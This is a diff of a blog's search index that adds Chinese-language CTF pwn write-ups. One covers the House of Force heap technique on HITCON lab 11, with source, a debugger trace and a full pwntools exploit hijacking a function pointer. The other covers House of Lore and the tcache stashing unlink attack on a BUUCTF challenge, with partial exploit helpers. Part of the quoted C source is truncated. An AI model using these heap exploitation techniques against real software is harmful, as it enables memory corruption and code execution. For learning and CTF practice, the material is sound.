@@ -454,9 +454,468 @@ itr()
       </tags>
   </entry>
   <entry>
-    <title>House Of Force</title>
+    <title>House of Force</title>
+    <url>/2023/09/12/House%20of%20Force/</url>
+    <content><![CDATA[<h1 id="PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）"><a href="#PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）" class="headerlink" title="PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）"></a>PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</h1><p>参考资料：<br>CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p>
+<p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p>
+<h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p>
+<p>计算一下 main_arena 距离 libc 的距离</p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png'><img src="https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png" alt="Snipaste_2023-09-12_17-05-27.png"></p>
+<h2 id="程序的源代码-c"><a href="#程序的源代码-c" class="headerlink" title="程序的源代码(c)"></a>程序的源代码(c)</h2><pre><code class="c">#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+struct item {
+  int size;
+  char *name;
+};
+
+struct item itemlist[100] = {0};
+
+int num;
+
+void hello_message() {
+  puts("There is a box with magic");
+  puts("what do you want to do in the box");
+}
+
+void goodbye_message() {
+  puts("See you next time");
+  puts("Thanks you");
+}
+
+struct box {
+  void (*hello_message)();
+  void (*goodbye_message)();
+};
+
+void menu() {
+  puts("----------------------------");
+  puts("Bamboobox Menu");
+  puts("----------------------------");
+  puts("1.show the items in the box");
+  puts("2.add a new item");
+  puts("3.change the item in the box");
+  puts("4.remove the item in the box");
+  puts("5.exit");
+  puts("----------------------------");
+  printf("Your choice:");
+}
+
+void show_item() {
+  int i;
+  if (!num) {
+    puts("No item in the box");
+  } else {
+    for (i = 0; i &lt; 100; i++) {
+      if (itemlist[i].name) {
+        printf("%d : %s", i, itemlist[i].name);
+      }
+    }
+    puts("");
+  }
+}
+
+int add_item() {
+
+  char sizebuf[8];
+  int length;
+  int i;
+  int size;
+  if (num &lt; 100) {
+    printf("Please enter the length of item name:");
+    read(0, sizebuf, 8);
+    length = atoi(sizebuf);
+    if (length == 0) {
+      puts("invaild length");
+      return 0;
+    }
+    for (i = 0; i &lt; 100; i++) {
+}
+
+void change_item() {
+
+  char indexbuf[8];
+  char lengthbuf[8];
+  int length;
+  int index;
+  int readsize;
+
+  if (!num) {
+    puts("No item in the box");
+  } else {
+    printf("Please enter the index of item:");
+    read(0, indexbuf, 8);
+    index = atoi(indexbuf);
+    if (itemlist[index].name) {
+      printf("Please enter the length of item name:");
+      read(0, lengthbuf, 8);
+      length = atoi(lengthbuf);
+      printf("Please enter the new name of the item:");
+      readsize = read(0, itemlist[index].name, length);
+      *(itemlist[index].name + readsize) = '\x00';
+    } else {
+      puts("invaild index");
+    }
+  }
+}
+void remove_item() {
+  char indexbuf[8];
+  int index;
+
+  if (!num) {
+    puts("No item in the box");
+  } else {
+    printf("Please enter the index of item:");
+    read(0, indexbuf, 8);
+    index = atoi(indexbuf);
+    if (itemlist[index].name) {
+      free(itemlist[index].name);
+      itemlist[index].name = 0;
+      itemlist[index].size = 0;
+      puts("remove successful!!");
+      num--;
+    } else {
+      puts("invaild index");
+    }
+  }
+}
+
+void magic() {
+  int fd;
+  char buffer[100];
+  fd = open("./flag", O_RDONLY);
+  read(fd, buffer, sizeof(buffer));
+  close(fd);
+  printf("%s", buffer);
+  exit(0);
+}
+
+int main() {
+
+  char choicebuf[8];
+  int choice;
+  struct box *bamboo;
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  bamboo = malloc(sizeof(struct box));
+  bamboo-&gt;hello_message = hello_message;
+  bamboo-&gt;goodbye_message = goodbye_message;
+  bamboo-&gt;hello_message();
+
+  while (1) {
+    menu();
+    read(0, choicebuf, 8);
+    choice = atoi(choicebuf);
+    switch (choice) {
+    case 1:
+      show_item();
+      break;
+    case 2:
+      add_item();
+      break;
+    case 3:
+      change_item();
+      break;
+    case 4:
+      remove_item();
+      break;
+    case 5:
+      bamboo-&gt;goodbye_message();
+      exit(0);
+      break;
+    default:
+      puts("invaild choice!!!");
+      break;
+    }
+  }
+
+  return 0;
+}
+</code></pre>
+<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void (**v4)(void); // [rsp+8h] [rbp-18h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  v4 = (void (**)(void))malloc(0x10uLL);
+  *v4 = (void (*)(void))hello_message;
+  v4[1] = (void (*)(void))goodbye_message;
+  (*v4)();
+  while ( 1 )
+  {
+    menu();
+    read(0, buf, 8uLL);
+    switch ( atoi(buf) )
+    {
+      case 1:
+        show_item();
+        break;
+      case 2:
+        add_item();
+        break;
+      case 3:
+        change_item(buf, buf);
+        break;
+      case 4:
+        remove_item();
+        break;
+      case 5:
+        v4[1]();
+        exit(0);
+      default:
+        puts("invaild choice!!!");
+        break;
+    }
+  }
+}
+</code></pre>
+<p>​	main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p>
+<h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><pre><code class="c">void __cdecl menu()
+{
+  puts("----------------------------");
+  puts("Bamboobox Menu");
+  puts("----------------------------");
+  puts("1.show the items in the box");
+  puts("2.add a new item");
+  puts("3.change the item in the box");
+  puts("4.remove the item in the box");
+  puts("5.exit");
+  puts("----------------------------");
+  printf("Your choice:");
+}
+</code></pre>
+<p>这是一个程序的菜单函数，没有什么特别的。</p>
+<h3 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912091832878.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912091832878.png" alt="image-20230912091832878"></p>
+<p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p>
+<h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092037725.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092037725.png" alt="image-20230912092037725"></p>
+<p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p>
+<h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092541664.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092541664.png" alt="image-20230912092541664"></p>
+<h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092703105.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092703105.png" alt="image-20230912092703105"></p>
+<p>程序free的很干净，不存在uaf</p>
+<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092723857.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092723857.png" alt="image-20230912092723857"></p>
+<p>目标地址，控制程序执行流到magic函数的位置即可get flag</p>
+<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092850070.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092850070.png" alt="image-20230912092850070"></p>
+<p>对应c代码的 item 结构体</p>
+<h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p>
+<ul>
+<li>chunk0:size=10，content=”aaaaa”</li>
+<li>chunk1:size=20，content=”bbbbb”</li>
+</ul>
+<pre><code class="c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani
+ng_lab11$ gdb bamboobox
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from bamboobox...(no debugging symbols found)...done.
+pwndbg&gt; r
+Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox 
+There is a box with magic
+what do you want to do in the box
+----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:2
+Please enter the length of item name:10
+Please enter the name of item:aaaaa
+----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:2
+Please enter the length of item name:20
+Please enter the name of item:bbbbb
+----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
+84	../sysdeps/unix/syscall-template.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
+ RAX  0xfffffffffffffe00
+ RBX  0x0
+ RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x8
+ RDI  0x0
+ RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0
+ R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700
+ R9   0xc
+ R10  0x0
+ R11  0x246
+ R12  0x4007a0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdd30 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]
+ RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff
+────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
+ ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff
+   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;
+    ↓
+   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]
+   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax
+   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax
+   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff
+   0x7ffff7b043a9 &lt;read+89&gt;               ret    
+ 
+   0x7ffff7b043aa                         nop    word ptr [rax + rax]
+   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;
+   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;
+    ↓
+   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8
+─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
+00:0000│ rsp  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]
+01:0008│      0x7fffffffdc30 ◂— 0x200400ee0
+02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0x400896 (hello_message) ◂— push   rbp
+03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0
+04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00
+05:0028│ rbp  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
+06:0030│      0x7fffffffdc58 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
+07:0038│      0x7fffffffdc60 ◂— 0x0
+───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
+ ► f 0     7ffff7b04360 __read_nocancel+7
+   f 1           400e5d main+166
+   f 2     7ffff7a2d840 __libc_start_main+240
+Program received signal SIGINT
+pwndbg&gt; 
+</code></pre>
+<p>ok，输入完成，接下来我们查看堆的分布</p>
+<pre><code class="c">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603020
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603040
+Size: 0x21
+
+Top chunk | PREV_INUSE
+Addr: 0x603060
+Size: 0x20fa1
+
+pwndbg&gt; 
+</code></pre>
+<p>堆的内存分布</p>
+<pre><code class="c">pwndbg&gt; x/30gx 0x603000
+0x603000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
+0x603010:	0x0000000000400896	0x00000000004008b1
+                    #hello_message      #goodbye_message
+0x603020:	0x0000000000000000	0x0000000000000021 #chunk0
+0x603030:	0x00000a6161616161	0x0000000000000000
+0x603040:	0x0000000000000000	0x0000000000000021 #chunk1
+0x603050:	0x00000a6262626262	0x0000000000000000
+0x603060:	0x0000000000000000	0x0000000000020fa1 #top_chunk
+......(省略内容均为空)
+0x6030e0:	0x0000000000000000	0x0000000000000000
+pwndbg&gt; 
+</code></pre>
+<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093548094.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093548094.png" alt="image-20230912093548094"></p>
+<p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093439237.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093439237.png" alt="image-20230912093439237"></p>
+<ul>
+<li>num记录着堆块的数量。</li>
+</ul>
+<p>查看一下堆指针信息</p>
+<pre><code class="c">pwndbg&gt; x/10gx 0x6020c0
+0x6020c0 &lt;itemlist&gt;:	0x000000000000000a	0x0000000000603030 #chunk0
+                        #struct_size        #struct_content_ptr
+0x6020d0 &lt;itemlist+16&gt;:	0x0000000000000014	0x0000000000603050 #chunk1
+                        #struct_size        #struct_content_ptr
+0x6020e0 &lt;itemlist+32&gt;:	0x0000000000000000	0x0000000000000000
+0x6020f0 &lt;itemlist+48&gt;:	0x0000000000000000	0x0000000000000000
+0x602100 &lt;itemlist+64&gt;:	0x0000000000000000	0x0000000000000000
+pwndbg&gt; 
+//注意struct_content_ptr指向malloc出来malloc_data的地址
+</code></pre>
+<h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><pre><code class="py">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = 'debug'
+p = process('./bamboobox')
+
+def cmd(choice):
+  p.sendlineafter('',str(choice))
+  
+def create(size,content):
+  cmd(2)
+  p.sendlineafter('item name:',str(size))
+  p.sendlineafter('item:',content)
+
+def edit(index,size,content):
+  cmd(3)
+  p.sendlineafter('of item:',str(index))
+  p.sendlineafter('item name:',str(size))
+  p.sendlineafter('the item:',content)
+
+def delete(index):
+  cmd(4)
+  p.sendlineafter('of item:',str(index))
+
+def quit():
+  cmd(5)
+
+magic = 0x400d49
+create(0x30, "aaaa")
+content='a'*0x30+'1'*8+p64(0xffffffffffffffff)
+edit(0,0x40,content)
+offset=-0x60-0x10
+create(offset,'bbbb')
+create(0x10,p64(magic)*2)
+quit()
+p.interactive()
+</code></pre>
+]]></content>
+      <tags>
+        <tag>House of 系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>House of Force2</title>
     <url>/2023/04/10/House%20of%20Force2/</url>
-    <content><![CDATA[<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p>
+    <content><![CDATA[<h1 id="House-Of-Force2"><a href="#House-Of-Force2" class="headerlink" title="House Of Force2"></a>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p>
 <p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p>
 <p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p>
 <h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><pre><code>// 获取当前的top chunk，并计算其对应的大小
@@ -754,8 +1213,584 @@ main()
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/09/11/House%20of%20Storm+%E5%A0%86SROP+orw/</url>
+    <title>House of Lore</title>
+    <url>/2023/04/10/House%20of%20Lore/</url>
+    <content><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p>
+<p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p>
+<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote>
+<p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
+</blockquote>
+<h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote>
+<p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p>
+</blockquote>
+<p>利用前提</p>
+<pre><code>1.能控制 Small Bin Chunk 的 bk 指针。
+
+2.程序可以越过Tache取Chunk。(使用calloc即可做到)
+
+3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。
+</code></pre>
+<h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p>
+<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p>
+<pre><code>void __fastcall __noreturn main(char *a1, char **a2, char **a3)
+{
+  char v3[268]; // [rsp+0h] [rbp-110h] BYREF
+  int v4; // [rsp+10Ch] [rbp-4h]
+
+  v4 = 0;
+  sub_11D5();
+  sub_1450();
+  sub_1269();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        menu();
+        v4 = readd();
+        if ( v4 != 3 )
+          break;
+        a1 = v3;
+        edit(v3, a2);
+      }
+      if ( v4 &gt; 3 )
+        break;
+      if ( v4 == 1 )
+      {
+        if ( x1c &lt;= 0 )
+          exitt();
+        a1 = v3;
+        add(v3);
+        --x1c;
+      }
+      else
+      {
+        if ( v4 != 2 )
+          goto LABEL_19;
+        a1 = v3;
+        delete(v3);
+      }
+    }
+    if ( v4 == 5 )
+      exitt();
+    if ( v4 &lt; 5 )
+    {
+      a1 = v3;
+      show(v3);
+    }
+    else
+    {
+      if ( v4 != 666 )
+LABEL_19:
+        exitt();
+      stack_attack(a1, a2);
+    }
+  }
+}
+</code></pre>
+<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p>
+<pre><code>int __fastcall sub_1515(__int64 a1)
+{
+  int v2; // [rsp+10h] [rbp-20h]
+  int v3; // [rsp+14h] [rbp-1Ch]
+  unsigned int v4; // [rsp+18h] [rbp-18h]
+  int size; // [rsp+1Ch] [rbp-14h]
+
+  printf("Please input the red packet idx: ");
+  v4 = readd();
+  if ( v4 &gt; 0x10 )
+    exitt();
+  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
+  v3 = readd();
+  if ( v3 == 2 )
+  {
+    size = 0xF0;
+  }
+  else if ( v3 &gt; 2 )
+  {
+    if ( v3 == 3 )
+    {
+      size = 0x300;
+    }
+    else
+    {
+      if ( v3 != 4 )
+        goto LABEL_14;
+      size = 0x400;
+    }
+  }
+  else
+  {
+    if ( v3 != 1 )
+    {
+LABEL_14:
+      size = 0;
+      goto LABEL_15;
+    }
+    size = 16;
+  }
+LABEL_15:
+  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )
+    exitt();
+  *(16LL * v4 + a1) = calloc(1uLL, size);
+  *(a1 + 16LL * v4 + 8) = size;
+  printf("Please input content: ");
+  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));
+  if ( v2 &lt;= 0 )
+    exitt();
+  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;
+  return puts("Done!");
+}
+</code></pre>
+<h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p>
+<pre><code>int __fastcall delete(__int64 a1)
+{
+  unsigned int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Please input the red packet idx: ");
+  v2 = readd();
+  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
+    exitt();
+  free(*(16LL * v2 + a1));                      // uaf
+                                                // 
+  return puts("Done!");
+}
+</code></pre>
+<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p>
+<pre><code>int __fastcall sub_1740(__int64 a1, __int64 a2)
+{
+  void *v2; // rsi
+  int v4; // [rsp+18h] [rbp-8h]
+  unsigned int v5; // [rsp+1Ch] [rbp-4h]
+
+  if ( qword_4010 &lt;= 0 )
+    exitt(a1, a2);
+  --qword_4010;
+  printf("Please input the red packet idx: ");
+  v5 = readd();
+  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )
+    exitt("Please input the red packet idx: ", a2);
+  printf("Please input content: ");
+  v2 = *(16LL * v5 + a1);
+  v4 = read(0, v2, *(16LL * v5 + a1 + 8));
+  if ( v4 &lt;= 0 )
+    exitt(0LL, v2);
+  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;
+  return puts("Done!");
+}
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int __fastcall sub_184E(__int64 a1)
+{
+  unsigned int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Please input the red packet idx: ");
+  v2 = readd();
+  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
+    exitt();
+  puts(*(16LL * v2 + a1));
+  return puts("Done!");
+}
+</code></pre>
+<h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p>
+<pre><code>ssize_t sub_13BD()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )
+    exitt();
+  puts("You get red packet!");
+  printf("What do you want to say?");
+  return read(0, buf, 0x90uLL);
+}
+</code></pre>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p>
+<h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p>
+<pre><code># coding=utf-8
+from pwn import *
+context(endian='little',os='linux',arch='amd64',log_level='debug') 
+
+sh = process('./RedPacket_SoEasyPwn1')
+#sh = remote('node4.buuoj.cn','27283')
+
+libc=ELF("./libc-2.29.so")
+
+ 
+ 
+
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims		    :sh.recvuntil(delims)
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
+def dbg():
+        gdb.attach(sh)
+        pause()
+ 
+
+def add(index,chunk_size_index,value):
+    ru('Your input: ')
+    sl('1')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
+    sl(str(chunk_size_index))
+    ru('Please input content: ')
+    sl(value)
+
+def free(index):
+    ru('Your input: ')
+    sl('2')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+
+def edit(index,value):
+    ru('Your input: ')
+    sl('3')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+    ru('Please input content: ')
+    sl(value)
+
+def show(index):
+    ru('Your input: ')
+    sl('4')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+</code></pre>
